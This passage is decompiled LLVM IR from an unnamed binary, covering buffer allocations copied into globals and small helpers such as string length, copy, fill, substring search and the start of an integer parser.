  %v0_138c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_138c8 = trunc i32 %v0_138c8 to i8
  store i8 %v1_138c8, i8* bitcast (i32* @global_var_1cf95.622 to i8*), align 4
  %v1_138cc = call i32 @_malloc(i32 111)
  store i32 111, i32* %r5.global-to-local, align 4
  store i32 %v1_138cc, i32* %r7.global-to-local, align 4
  %v3_138e0 = call i32 @function_13ad0(i32 %v1_138cc, i32 ptrtoint (i32* @global_var_14978.624 to i32), i32 111)
  %v0_138e4 = load i32, i32* %r5.global-to-local, align 4
  %v0_138e8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_138e8, i32* @global_var_1cf98.625, align 4
  %v1_138ec = trunc i32 %v0_138e4 to i8
  store i8 %v1_138ec, i8* bitcast (i32* @global_var_1cf9c.626 to i8*), align 4
  %v0_138f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_138f0 = trunc i32 %v0_138f0 to i8
  store i8 %v1_138f0, i8* bitcast (i32* @global_var_1cf9d.627 to i8*), align 4
  %v1_138f4 = call i32 @_malloc(i32 %v0_138e4)
  %v0_138f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_138f4, i32* %r7.global-to-local, align 4
  %v3_13904 = call i32 @function_13ad0(i32 %v1_138f4, i32 ptrtoint (i32* @global_var_149e8.629 to i32), i32 %v0_138f8)
  %v0_1390c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1390c, i32* @global_var_1cfa0.630, align 4
  %v0_13910 = load i32, i32* %r5.global-to-local, align 4
  %v1_13910 = trunc i32 %v0_13910 to i8
  store i8 %v1_13910, i8* bitcast (i32* @global_var_1cfa4.631 to i8*), align 4
  %v0_13914 = load i32, i32* %r6.global-to-local, align 4
  %v1_13914 = trunc i32 %v0_13914 to i8
  store i8 %v1_13914, i8* bitcast (i32* @global_var_1cfa5.632 to i8*), align 4
  %v1_13918 = call i32 @_malloc(i32 110)
  %v0_1391c = load i32, i32* %r5.global-to-local, align 4
  %v1_1391c = add i32 %v0_1391c, -1
  store i32 %v1_1391c, i32* %r5.global-to-local, align 4
  store i32 %v1_13918, i32* %r7.global-to-local, align 4
  %v3_1392c = call i32 @function_13ad0(i32 %v1_13918, i32 ptrtoint (i32* @global_var_14a58.634 to i32), i32 %v1_1391c)
  %v0_13930 = load i32, i32* %r5.global-to-local, align 4
  %v0_13934 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13934, i32* @global_var_1cfa8.635, align 4
  %v1_13938 = trunc i32 %v0_13930 to i8
  store i8 %v1_13938, i8* bitcast (i32* @global_var_1cfac.636 to i8*), align 4
  %v0_1393c = load i32, i32* %r6.global-to-local, align 4
  %v1_1393c = trunc i32 %v0_1393c to i8
  store i8 %v1_1393c, i8* bitcast (i32* @global_var_1cfad.637 to i8*), align 4
  %v1_13940 = call i32 @_malloc(i32 %v0_13930)
  %v0_13944 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13940, i32* %r7.global-to-local, align 4
  %v3_13950 = call i32 @function_13ad0(i32 %v1_13940, i32 ptrtoint (i32* @global_var_14ac8.639 to i32), i32 %v0_13944)
  %v0_13958 = load i32, i32* %r5.global-to-local, align 4
  %v1_13958 = trunc i32 %v0_13958 to i8
  store i8 %v1_13958, i8* bitcast (i32* @global_var_1cfb4.640 to i8*), align 4
  %v0_1395c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1395c, i32* @global_var_1cfb0.641, align 4
  %v0_13960 = load i32, i32* %r6.global-to-local, align 4
  %v1_13960 = trunc i32 %v0_13960 to i8
  store i8 %v1_13960, i8* bitcast (i32* @global_var_1cfb5.642 to i8*), align 4
  %v1_13964 = call i32 @_malloc(i32 117)
  store i32 %v1_13964, i32* %r5.global-to-local, align 4
  %v3_13974 = call i32 @function_13ad0(i32 %v1_13964, i32 ptrtoint (i32* @global_var_14b38.644 to i32), i32 117)
  store i32 117, i32* %r3.global-to-local, align 4
  %v0_1397c = load i32, i32* %r6.global-to-local, align 4
  %v1_1397c = trunc i32 %v0_1397c to i8
  %v2_1397c = load i32, i32* %r4.global-to-local, align 4
  %v3_1397c = add i32 %v2_1397c, 413
  %v4_1397c = inttoptr i32 %v3_1397c to i8*
  store i8 %v1_1397c, i8* %v4_1397c, align 1
  %v0_13980 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13980, i32* @global_var_1cfb8.645, align 4
  %v0_13984 = load i32, i32* %r3.global-to-local, align 4
  %v1_13984 = trunc i32 %v0_13984 to i8
  store i8 %v1_13984, i8* bitcast (i32* @global_var_1cfbc.646 to i8*), align 4
  %v2_13988 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13988, i32* %r4.global-to-local, align 4
  ret i32 %v3_13974

; uselistorder directives
  uselistorder i32 %v1_13940, { 1, 0 }
  uselistorder i32 %v1_13918, { 1, 0 }
  uselistorder i32 %v1_138f4, { 1, 0 }
  uselistorder i32 %v1_138cc, { 1, 0 }
  uselistorder i32 %v1_13858, { 1, 0 }
  uselistorder i32 %v1_137e4, { 1, 0 }
  uselistorder i32 %v1_137c0, { 1, 0 }
  uselistorder i32 %v1_1379c, { 1, 0 }
  uselistorder i32 %v1_13778, { 1, 0 }
  uselistorder i32 %v1_13754, { 1, 0 }
  uselistorder i32 %v1_13730, { 1, 0 }
  uselistorder i32 %v1_13668, { 1, 0 }
  uselistorder i32 %v1_13504, { 1, 0 }
  uselistorder i32 %v1_134e0, { 1, 0 }
  uselistorder i32 %v1_1341c, { 1, 0 }
  uselistorder i32 %v1_133f4, { 1, 0 }
  uselistorder i32 %v1_13380, { 1, 0 }
  uselistorder i32 %v1_132e0, { 1, 0 }
  uselistorder i32 %v1_1326c, { 1, 0 }
  uselistorder i32 %v1_13244, { 1, 0 }
  uselistorder i32 %v1_1321c, { 1, 0 }
  uselistorder i32 %v1_131e8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 23, 24, 22, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 98, 99, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 92, 94, 95, 96, 97 }
  uselistorder i32 117, { 2, 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 12, 10, 5 }
  uselistorder i32 12, { 7, 8, 20, 21, 66, 67, 68, 22, 19, 23, 24, 25, 26, 27, 28, 30, 31, 29, 69, 70, 71, 6, 72, 73, 75, 76, 77, 3, 79, 74, 5, 34, 32, 33, 4, 11, 12, 13, 14, 15, 16, 78, 35, 9, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 47, 48, 49, 50, 51, 18, 52, 53, 54, 55, 56, 57, 10, 58, 59, 60, 61, 62, 63, 64, 65, 0, 1, 80, 81, 82, 83, 2, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32 17, { 9, 3, 0, 26, 10, 11, 4, 12, 5, 13, 6, 14, 7, 15, 8, 16, 17, 1, 18, 19, 20, 2, 21, 22, 23, 24, 25 }
  uselistorder i32 21, { 8, 3, 1, 9, 4, 10, 5, 11, 6, 12, 13, 14, 7, 0, 15, 2, 16 }
  uselistorder i32 22, { 7, 1, 0, 2, 8, 3, 9, 4, 10, 12, 11, 5, 6, 13 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 19, { 4, 8, 1, 5, 9, 6, 10, 7, 11, 0, 15, 12, 2, 13, 3, 14 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8 6, { 5, 6, 4, 7, 0, 8, 9, 1, 2, 3 }
  uselistorder i32 6, { 38, 13, 2, 14, 39, 0, 79, 15, 80, 40, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 28, 29, 30, 31, 4, 32, 41, 42, 43, 5, 44, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 8, 53, 54, 55, 33, 56, 9, 57, 58, 59, 34, 60, 10, 61, 62, 63, 35, 64, 65, 66, 67, 68, 36, 69, 11, 70, 71, 72, 73, 74, 75, 37, 76, 12, 77, 78, 81, 82, 83, 84 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 13, { 12, 4, 2, 13, 14, 15, 45, 5, 46, 0, 1, 6, 7, 8, 9, 16, 17, 18, 19, 20, 10, 21, 22, 23, 24, 25, 26, 27, 28, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 3, 43, 44 }
  uselistorder i8 4, { 3, 2, 0, 1 }
  uselistorder i8 11, { 2, 3, 4, 0, 1 }
  uselistorder i32 11, { 13, 4, 1, 14, 5, 2, 15, 6, 3, 43, 44, 45, 46, 47, 0, 16, 7, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 8, 28, 29, 30, 9, 31, 32, 33, 10, 34, 35, 36, 37, 38, 39, 40, 41, 42, 11, 48, 49, 50, 12, 51 }
  uselistorder i8 5, { 11, 12, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 13, 9 }
  uselistorder i32 5, { 34, 35, 14, 5, 3, 16, 36, 4, 15, 37, 1, 17, 83, 18, 84, 19, 85, 20, 86, 21, 87, 22, 88, 23, 89, 24, 90, 25, 91, 26, 92, 27, 93, 28, 94, 0, 38, 39, 40, 29, 30, 31, 32, 41, 42, 43, 44, 6, 45, 46, 47, 48, 7, 49, 50, 51, 52, 53, 54, 55, 56, 8, 57, 58, 59, 9, 60, 61, 62, 10, 63, 64, 65, 66, 11, 67, 68, 69, 70, 71, 72, 73, 12, 74, 75, 76, 77, 78, 79, 80, 13, 81, 82, 95, 2, 96, 97, 33, 98 }
  uselistorder i32 7, { 3, 37, 4, 15, 39, 16, 38, 2, 17, 70, 18, 71, 19, 72, 20, 73, 21, 74, 22, 75, 23, 76, 24, 77, 40, 25, 26, 27, 28, 29, 30, 31, 32, 33, 41, 42, 43, 5, 44, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 8, 53, 9, 54, 55, 10, 56, 57, 11, 58, 59, 60, 61, 62, 12, 63, 64, 65, 66, 67, 13, 68, 69, 0, 34, 78, 1, 35, 79, 80, 36, 14, 81 }
  uselistorder i32 29, { 7, 1, 0, 8, 9, 5, 2, 3, 4, 6 }
  uselistorder i32 (i32, i32, i32)* @function_13ad0, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 4, 3, 1, 0, 9, 8, 7, 6, 5, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1ce20.393 to i32), { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32)* @_malloc, { 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 18, { 15, 4, 0, 16, 5, 1, 17, 2, 6, 7, 18, 8, 19, 9, 20, 14, 10, 3, 21, 22, 11, 23, 12, 24, 13, 25 }
}

define i32 @function_13a54(i8* %arg1) local_unnamed_addr {
dec_label_pc_13a54:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_13a58 = load i8, i8* %arg1, align 1
  %v4_13a58 = zext i8 %v3_13a58 to i32
  %v2_13a5c = icmp eq i8 %v3_13a58, 0
  br i1 %v2_13a5c, label %dec_label_pc_13a78, label %bb

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a68, %dec_label_pc_13a54
  %merge = phi i32 [ %v4_13a58, %dec_label_pc_13a54 ], [ %v1_13a68, %dec_label_pc_13a68 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13a54
  br label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a68, %bb
  %v0_13a68 = phi i32 [ %v1_13a68, %dec_label_pc_13a68 ], [ 0, %bb ]
  %v1_13a68 = add i32 %v0_13a68, 1
  %v2_13a6c = add i32 %v1_13a68, %tmp
  %v3_13a6c = inttoptr i32 %v2_13a6c to i8*
  %v4_13a6c = load i8, i8* %v3_13a6c, align 1
  %v2_13a70 = icmp eq i8 %v4_13a6c, 0
  br i1 %v2_13a70, label %dec_label_pc_13a78, label %dec_label_pc_13a68

; uselistorder directives
  uselistorder i32 %v1_13a68, { 1, 0, 2 }
}

define i32 @function_13a7c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a7c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_13a7c = load i8, i8* %arg1, align 1
  %v3_13a7c = zext i8 %v2_13a7c to i32
  %v2_13a80 = icmp eq i8 %v2_13a7c, 0
  br i1 %v2_13a80, label %dec_label_pc_13ac4, label %dec_label_pc_13a88

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a7c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a8c

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_13a8c, %dec_label_pc_13a88
  %v0_13a8c = phi i32 [ %v1_13a8c, %dec_label_pc_13a8c ], [ 0, %dec_label_pc_13a88 ]
  %v1_13a8c = add i32 %v0_13a8c, 1
  store i32 %v1_13a8c, i32* %ip.global-to-local, align 4
  %v2_13a90 = add i32 %v1_13a8c, %tmp
  %v3_13a90 = inttoptr i32 %v2_13a90 to i8*
  %v4_13a90 = load i8, i8* %v3_13a90, align 1
  %v2_13a94 = icmp eq i8 %v4_13a90, 0
  br i1 %v2_13a94, label %dec_label_pc_13a9c, label %dec_label_pc_13a8c

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a8c
  %v7_13a9c = icmp eq i32 %v0_13a8c, -2
  br i1 %v7_13a9c, label %dec_label_pc_13abc, label %dec_label_pc_13aa8.preheader

dec_label_pc_13aa8.preheader:                     ; preds = %dec_label_pc_13a9c, %dec_label_pc_13ac4
  %storemerge = phi i32 [ %v3_13a7c, %dec_label_pc_13ac4 ], [ %v1_13a8c, %dec_label_pc_13a9c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13ab4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13aa8

dec_label_pc_13aa8:                               ; preds = %dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge, %dec_label_pc_13aa8.preheader
  %v2_13ab4 = phi i32 [ %v5_13ab4, %dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge ], [ %v2_13ab4.pre, %dec_label_pc_13aa8.preheader ]
  %v0_13aac = phi i32 [ %v0_13aac.pre, %dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge ], [ %tmp, %dec_label_pc_13aa8.preheader ]
  %v0_13aa8 = phi i32 [ %v0_13aa8.pre, %dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge ], [ %storemerge, %dec_label_pc_13aa8.preheader ]
  %v1_13aa8 = add i32 %v0_13aa8, -1
  store i32 %v1_13aa8, i32* %r2.global-to-local, align 4
  %v1_13aac = inttoptr i32 %v0_13aac to i8*
  %v2_13aac = load i8, i8* %v1_13aac, align 1
  %v5_13aac = add i32 %v0_13aac, 1
  store i32 %v5_13aac, i32* %r1.global-to-local, align 4
  %v3_13ab0 = icmp eq i32 %v0_13aa8, 0
  %v3_13ab4 = inttoptr i32 %v2_13ab4 to i8*
  store i8 %v2_13aac, i8* %v3_13ab4, align 1
  %v4_13ab4 = load i32, i32* @r0, align 4
  %v5_13ab4 = add i32 %v4_13ab4, 1
  store i32 %v5_13ab4, i32* @r0, align 4
  br i1 %v3_13ab0, label %dec_label_pc_13abc.loopexit, label %dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge

dec_label_pc_13aa8.dec_label_pc_13aa8_crit_edge:  ; preds = %dec_label_pc_13aa8
  %v0_13aa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_13aac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13aa8

dec_label_pc_13abc.loopexit:                      ; preds = %dec_label_pc_13aa8
  %v0_13abc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13abc.loopexit, %dec_label_pc_13a9c
  %v0_13abc = phi i32 [ %v0_13abc.pre, %dec_label_pc_13abc.loopexit ], [ %v1_13a8c, %dec_label_pc_13a9c ]
  ret i32 %v0_13abc

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13a7c
  store i32 %v3_13a7c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13aa8.preheader

; uselistorder directives
  uselistorder i32 %v5_13ab4, { 1, 0 }
  uselistorder i32 %v0_13aac, { 1, 0 }
  uselistorder i32 %v1_13a8c, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_13a7c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13aa8.preheader, { 1, 0 }
}

define i32 @function_13ad0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13ad0:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %v2_13ad0 = icmp eq i32 %arg3, 0
  br i1 %v2_13ad0, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13adc, %dec_label_pc_13ad0
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13ad0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13adc

dec_label_pc_13adc:                               ; preds = %dec_label_pc_13adc, %bb
  %v0_13adc = phi i32 [ %v1_13ae4, %dec_label_pc_13adc ], [ 0, %bb ]
  %v2_13adc = add i32 %v0_13adc, %arg2
  %v3_13adc = inttoptr i32 %v2_13adc to i8*
  %v4_13adc = load i8, i8* %v3_13adc, align 1
  %v4_13ae0 = add i32 %v0_13adc, %arg1
  %v5_13ae0 = inttoptr i32 %v4_13ae0 to i8*
  store i8 %v4_13adc, i8* %v5_13ae0, align 1
  %v0_13ae4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ae4 = add i32 %v0_13ae4, 1
  store i32 %v1_13ae4, i32* %ip.global-to-local, align 4
  %v9_13ae8 = icmp eq i32 %v1_13ae4, %arg3
  br i1 %v9_13ae8, label %.loopexit, label %dec_label_pc_13adc

; uselistorder directives
  uselistorder i32 %v1_13ae4, { 1, 2, 0 }
  uselistorder i32* @r2, { 0, 5, 2, 3, 4, 1 }
}

define i32 @function_13af4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13af4:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_13af4 = icmp eq i32 %arg2, 0
  br i1 %v2_13af4, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13b04, %dec_label_pc_13af4
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13af4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b04

dec_label_pc_13b04:                               ; preds = %dec_label_pc_13b04.dec_label_pc_13b04_crit_edge, %bb
  %v2_13b04 = phi i32 [ %v1_13b08, %dec_label_pc_13b04.dec_label_pc_13b04_crit_edge ], [ 0, %bb ]
  %v0_13b04.off0 = phi i8 [ %extract.t, %dec_label_pc_13b04.dec_label_pc_13b04_crit_edge ], [ 0, %bb ]
  %v4_13b04 = add i32 %v2_13b04, %arg1
  %v5_13b04 = inttoptr i32 %v4_13b04 to i8*
  store i8 %v0_13b04.off0, i8* %v5_13b04, align 1
  %v0_13b08 = load i32, i32* %r3.global-to-local, align 4
  %v1_13b08 = add i32 %v0_13b08, 1
  store i32 %v1_13b08, i32* %r3.global-to-local, align 4
  %v9_13b0c = icmp eq i32 %v1_13b08, %arg2
  br i1 %v9_13b0c, label %.loopexit, label %dec_label_pc_13b04.dec_label_pc_13b04_crit_edge

dec_label_pc_13b04.dec_label_pc_13b04_crit_edge:  ; preds = %dec_label_pc_13b04
  %v0_13b04.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_13b04.pre to i8
  br label %dec_label_pc_13b04

; uselistorder directives
  uselistorder i32 %v1_13b08, { 1, 2, 0 }
}

define i32 @function_13b18(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13b18:
  %v7_13b2c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_13b2c, label %dec_label_pc_13b30, label %dec_label_pc_13b38

dec_label_pc_13b30:                               ; preds = %dec_label_pc_13b4c, %dec_label_pc_13b18, %dec_label_pc_13b38
  ret i32 -1

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b18
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_13b30, label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %dec_label_pc_13b38
  br label %dec_label_pc_13b58

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13b70, %dec_label_pc_13b58
  %v1_13b4c = add i32 %v0_13b78, 1
  %v9_13b50 = icmp eq i32 %v1_13b4c, %arg2
  br i1 %v9_13b50, label %dec_label_pc_13b30, label %dec_label_pc_13b58

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13b4c, %dec_label_pc_13b40
  %v0_13b78 = phi i32 [ %v1_13b4c, %dec_label_pc_13b4c ], [ 0, %dec_label_pc_13b40 ]
  %v0_13b64 = phi i32 [ %v1_13b64., %dec_label_pc_13b4c ], [ 0, %dec_label_pc_13b40 ]
  %v2_13b58 = add i32 %v0_13b64, %arg3
  %v3_13b58 = inttoptr i32 %v2_13b58 to i8*
  %v4_13b58 = load i8, i8* %v3_13b58, align 1
  %v2_13b5c = add i32 %v0_13b78, %arg1
  %v3_13b5c = inttoptr i32 %v2_13b5c to i8*
  %v4_13b5c = load i8, i8* %v3_13b5c, align 1
  %v9_13b60 = icmp eq i8 %v4_13b5c, %v4_13b58
  %v1_13b64 = add i32 %v0_13b64, 1
  %v1_13b64. = select i1 %v9_13b60, i32 %v1_13b64, i32 0
  br i1 %v9_13b60, label %dec_label_pc_13b70, label %dec_label_pc_13b4c

dec_label_pc_13b70:                               ; preds = %dec_label_pc_13b58
  %v9_13b70 = icmp eq i32 %v1_13b64., %arg4
  br i1 %v9_13b70, label %dec_label_pc_13b78, label %dec_label_pc_13b4c

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b70
  %v1_13b78 = add i32 %v0_13b78, 1
  ret i32 %v1_13b78

; uselistorder directives
  uselistorder i1 %v9_13b60, { 1, 0 }
  uselistorder i32 %v0_13b64, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b30, { 0, 2, 1 }
}

define i32 @function_13b80(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13b80:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_13b8c

dec_label_pc_13b8c:                               ; preds = %.thread, %dec_label_pc_13ba4, %bb, %dec_label_pc_13b80
  %v0_13b8c = phi i32 [ %tmp, %dec_label_pc_13b80 ], [ %v5_13b8c, %bb ], [ %v5_13b8c, %dec_label_pc_13ba4 ], [ %v5_13b8c, %.thread ]
  %v1_13b8c = inttoptr i32 %v0_13b8c to i8*
  %v2_13b8c = load i8, i8* %v1_13b8c, align 1
  %v5_13b8c = add i32 %v0_13b8c, 1
  %v7_13b94 = icmp eq i8 %v2_13b8c, 9
  br i1 %v7_13b94, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13b8c
  br label %dec_label_pc_13b8c

bb:                                               ; preds = %dec_label_pc_13b8c
  %v8_13b98 = icmp eq i8 %v2_13b8c, 32
  br i1 %v8_13b98, label %dec_label_pc_13b8c, label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %bb
  %v7_13ba4 = icmp eq i8 %v2_13b8c, 10
  br i1 %v7_13ba4, label %dec_label_pc_13b8c, label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13ba4
  %v7_13bac = icmp eq i8 %v2_13b8c, 45
  br i1 %v7_13bac, label %dec_label_pc_13c8c, label %dec_label_pc_13bb4

dec_label_pc_13bb4:                               ; preds = %dec_label_pc_13bac
  %v7_13bb4 = icmp eq i8 %v2_13b8c, 43
  br i1 %v7_13bb4, label %bb54, label %dec_label_pc_13bc4

bb54:                                             ; preds = %dec_label_pc_13bb4
  %v2_13bb8 = inttoptr i32 %v5_13b8c to i8*
  %v3_13bb8 = load i8, i8* %v2_13bb8, align 1
  %v6_13bb8 = add i32 %v0_13b8c, 2
  br label %dec_label_pc_13bc4

dec_label_pc_13bc4:                               ; preds = %bb54, %dec_label_pc_13bb4, %dec_label_pc_13c8c
  %v0_13c7042 = phi i32 [ %v5_13c8c, %dec_label_pc_13c8c ], [ %v5_13b8c, %dec_label_pc_13bb4 ], [ %v6_13bb8, %bb54 ]
  %v0_13bec17.in = phi i8 [ %v2_13c8c, %dec_label_pc_13c8c ], [ %v2_13b8c, %dec_label_pc_13bb4 ], [ %v3_13bb8, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_13c8c ], [ 2147483647, %dec_label_pc_13bb4 ], [ 2147483647, %bb54 ]
  %v0_13c9c = phi i32 [ 1, %dec_label_pc_13c8c ], [ 0, %dec_label_pc_13bb4 ], [ 0, %bb54 ]
  %v2_13bcc = urem i32 %storemerge1, %arg2
  %v2_13bdc = udiv i32 %storemerge1, %arg2
  store i32 %v2_13bdc, i32* @lr, align 4
  br label %dec_label_pc_13bec

dec_label_pc_13bec:                               ; preds = %.thread8, %dec_label_pc_13bc4
  %v0_13c70 = phi i32 [ %v5_13c70, %.thread8 ], [ %v0_13c7042, %dec_label_pc_13bc4 ]
  %v2_13c6811 = phi i32 [ %v1_13c8429, %.thread8 ], [ 0, %dec_label_pc_13bc4 ]
  %v1_13c44 = phi i32 [ %v0_13c7827, %.thread8 ], [ 0, %dec_label_pc_13bc4 ]
  %v1_13c2c.in = phi i8 [ %v2_13c70, %.thread8 ], [ %v0_13bec17.in, %dec_label_pc_13bc4 ]
  %v1_13c2c = zext i8 %v1_13c2c.in to i32
  %v1_13bec = urem i32 %v1_13c2c, 256
  %v1_13bf0 = add nsw i32 %v1_13bec, -48
  %v1_13bf8 = add nsw i32 %v1_13bec, -97
  %v1_13bfc = add nsw i32 %v1_13c2c, -48
  %v1_13c00 = add nsw i32 %v1_13bec, -65
  %tmp77 = icmp ult i32 %v1_13bf0, 10
  br i1 %tmp77, label %dec_label_pc_13c30, label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13bec
  %v2_13c08 = icmp ugt i32 %v1_13c00, 24
  %v7_13c08 = icmp eq i32 %v1_13c00, 25
  %v2_13c0c = xor i1 %v7_13c08, true
  %v3_13c0c = and i1 %v2_13c08, %v2_13c0c
  br i1 %v3_13c0c, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_13c08
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_13c08, %bb55
  %v0_13c2021 = phi i32 [ %v1_13bfc, %dec_label_pc_13c08 ], [ 0, %bb55 ]
  %v2_13c10 = xor i1 %v2_13c08, true
  %v3_13c10 = or i1 %v7_13c08, %v2_13c10
  br i1 %v3_13c10, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_13c20 = phi i32 [ %v0_13c2021, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_13c0c, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_13c18 = icmp ugt i32 %v1_13bf8, 24
  %v11_13c18 = icmp eq i32 %v1_13bf8, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_13c1c = phi i1 [ %v7_13c08, %bb58 ], [ %v11_13c18, %bb59 ]
  %v0_13c1c = phi i1 [ %v2_13c08, %bb58 ], [ %v6_13c18, %bb59 ]
  %v2_13c1c = xor i1 %v1_13c1c, true
  %v3_13c1c = and i1 %v0_13c1c, %v2_13c1c
  br i1 %v3_13c1c, label %dec_label_pc_13c78, label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %bb60
